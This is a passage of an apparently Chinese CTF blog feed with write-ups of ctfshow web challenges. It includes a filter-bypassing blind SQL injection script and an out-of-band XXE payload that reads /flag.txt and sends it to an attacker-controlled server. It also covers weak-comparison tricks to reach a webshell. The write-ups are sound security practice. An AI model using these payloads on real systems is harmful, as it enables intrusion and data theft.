data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3VuZXhwZWN0ZWR0aGluZy9hcnRpY2xlL2RldGFpbHMvMTIxMTMzMzAy\">https://blog.csdn.net/unexpectedthing/article/details/121133302</span></p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubGVhbm90ZS5jb20vcG9zdC9zbm93bWluZy85ZGExODRlZjI0YmQ=\">PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</span><br />\nPHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹 shell 成功】</p>\n<p>PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</p>\n<p>PHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹 shell 成功】</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/AK%E8%B5%9B/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/AK%E8%B5%9B/",
            "title": "AK赛",
            "date_published": "2022-10-04T15:25:32.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"签到_观己\"><a class=\"anchor\" href=\"#签到_观己\">#</a> 签到_观己</h2>\n<p>nginx 日志包含</p>\n<h2 id=\"web1_观字\"><a class=\"anchor\" href=\"#web1_观字\">#</a> web1_观字</h2>\n<p>ip 地址可以使用  <code>。</code>  代替  <code>.</code></p>\n<h2 id=\"web2_观星\"><a class=\"anchor\" href=\"#web2_观星\">#</a> web2_观星</h2>\n<p>SQL 注入</p>\n<p>令 <code>id=1’</code> 返回 <code>enheng?</code>  发现 <code>’</code> 被过滤了，fuzz 测试过滤了 <code>空格、’、&quot;、=、like、ascii、union、order by、|、sleep、 </code> 。</p>\n<p>常用的盲注 payload 为 payload= <code>1^if (ascii (substr ('flag',1,1))=104,1,0)</code></p>\n<p>过滤了空格可以用括号代替；</p>\n<p>过滤了单引号可以用 16 进制代替；</p>\n<p>过滤了逗号，对于 <code>substr</code>  可以用 <code>substr (database () from 1 for 1 )</code>  代替 <code>substr (database (),1,1)</code> ， <code>if</code>  中有逗号可以用 <code>case when</code>  代替 <code>if</code> ；</p>\n<p>过滤了 <code>ascii</code>  可以用 <code>ord</code>  代替；</p>\n<p>过滤了等号和 <code>like</code>  可以用 <code>regexp</code>  代替。</p>\n<p>这样上面的常规语句就可以转化为<br />\n <code>id=1^case (ord (substr (database () from (1) for (1)))) when (102) then (2) else (3) end</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://a1f44411-4202-45d0-a2c2-58d491438f96.challenge.ctf.show/index.php?id=1^\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"i=\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">126</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\"># u=\"case (ord (substr (database () from (&#123;0&#125;) for (1)))) when (&#123;1&#125;) then (2) else (3) end\".format (i,j)  #库名  web1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\"># u=\"case (ord (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema) regexp (database ())) from (&#123;0&#125;) for (1)))) when (&#123;1&#125;) then (2) else (3) end\".format (i,j) #表名 flag、page、user</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\"># u=\"case (ord (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name) regexp (0x666c6167)) from (&#123;0&#125;) for (1)))) when (&#123;1&#125;) then (2) else (3) end\".format (i,j) #列名 FLAG_COLUMN、flag</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        u <span class=\"token operator\">=</span> <span class=\"token string\">\"case(ord(substr((select(group_concat(flag))from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># flag 字段</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        u <span class=\"token operator\">=</span> url<span class=\"token operator\">+</span>u</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        t <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I asked nothing\"</span> <span class=\"token keyword\">in</span> t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h2 id=\"web3_观图\"><a class=\"anchor\" href=\"#web3_观图\">#</a> web3_观图</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//$key = substr(md5('ctfshow'.rand()),3,8);</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//flag in config.php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$image</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">openssl_decrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$image</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'bf-ecb'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'content-type:image/gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><code>?image=N6bf8Bd8jm0SpmTZGl0isw==</code></p>\n<h2 id=\"web4_观心\"><a class=\"anchor\" href=\"#web4_观心\">#</a> web4_观心</h2>\n<p>点击占卜后可以发现网络模块中多了一个 api.php ，查看请求数据，分别提交了 api 和 city</p>\n<p>查阅，为 xxe 漏洞，在服务器上写两个文件</p>\n<p>test.xml</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;!ENTITY % remote SYSTEM \"http://公网ip+port/test.dtd\"> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>%remote;%int;%send; </span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>test.dtd</p>\n<pre><code class=\"language-dtd\">&lt;!ENTITY % p1 SYSTEM &quot;php://filter/read=convert-base64.encode/resource=/flag.txt&quot;&gt;\n&lt;!ENTITY % p2 &quot;&lt;!ENTITY xxe SYSTEM 'http://ip/pass=%p1;'&gt;&quot;&gt;\n%p2;\n</code></pre>\n<p>然后访问 api.php</p>\n<p>POST 内容如下</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>api&#x3D;http:&#x2F;&#x2F; 公网 ip+port&#x2F;test.xml&amp;city&#x3D;</pre></td></tr></table></figure><p>最后可以看到 flag</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/AK%E8%B5%9B_web_%E8%A7%82%E5%BF%83_1.jpg\" alt=\"\" /></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/36D%E6%9D%AF/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/36D%E6%9D%AF/",
            "title": "36D杯",
            "date_published": "2022-10-04T15:22:32.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"给你-shell\"><a class=\"anchor\" href=\"#给你-shell\">#</a> 给你 shell</h2>\n<p>进入后查看源码，可以发现标签</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>[./?view_source](http://dc592659-7387-4929-80b9-ebd1efabecf7.challenge.ctf.show/?view_source)<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">target</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>_blank<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">hidden</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>点击，挑战到源码界面</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'view_source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkCookie</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">':'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'&#123;\"secret\"'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[\\\"0-9A-Z]*&#125;$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">theFirstTimeSetCookie</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'secret'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">haveFun</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_f_g</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token variable\">$_g_r</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token variable\">$_m_u</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_f_g</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token variable\">$_h_p</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtoupper</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_m_u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$_g_r</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token variable\">$_i</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_h_p</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token variable\">$_i</span> <span class=\"token operator\">=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_i</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'secret'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$json</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'secret'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'secret'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&#123;\"secret\":\"'</span> <span class=\"token operator\">.</span> <span class=\"token function\">strtoupper</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'y1ng'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'\"&#125;'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">7200</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token function\">checkCookie</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$json</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> @<span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$json</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'no'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'give_me_shell'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'secret'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$flag_md5</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">haveFun</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"here is your webshell: <span class=\"token interpolation\"><span class=\"token variable\">$shell_path</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>由该代码可知是为了获得 webshell 的地址，即要使得 <code>$obj['secret'] != $flag_md5</code>  为 false，但在前后并无发现关于 flag 的信息，唯一能获取的是即为后面的 <code>haveFun($flag)</code>  函数，有该函数本体代码，可以知道每一位 flag 的 ascii 码值 <code>与操作</code>  0 的值。（这里有个知识点，小于 65 的数与 0 为 0，64-127 与 0 为 64）。而在 64-127 的 ascii 里均不为数字，而在 MD5 值和函数转大写，只有数字和大写字母。所以可根据打印结果判断 md5 的数据组成。</p>\n<p>在 <code>$obj['secret'] != $flag_md5</code>  的判断中，为弱等于，所以不用知道 <code>flag_md5</code>  的全部值，如果 flag 前几位为数字，可用弱类型比较的特性绕过。于是先随便输入一个 <code>secret</code>  值，得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>0006464640064064646464006406464064640064006400000000000</pre></td></tr></table></figure><p>即 flag 的 md5 开头三位为数字，那么传入的 secret 为一个三位数，可以是判断表达过绕过，进行爆破，可以得到 115 为正确的</p>\n<p>输入  <code>&#123;&quot;secret&quot;:115&#125;</code>  ，得到</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/ctfshow_1.jpg\" alt=\"\" /></p>\n<p>即网站  <code>w3b5HeLLlll123.php</code></p>\n<p>进入，源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//there are some secret waf that you will never know, fuzz me if you can</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">require</span> <span class=\"token string double-quoted-string\">\"hidden_filter.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;script>location.href=\\'./index.php\\'&lt;/script>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span 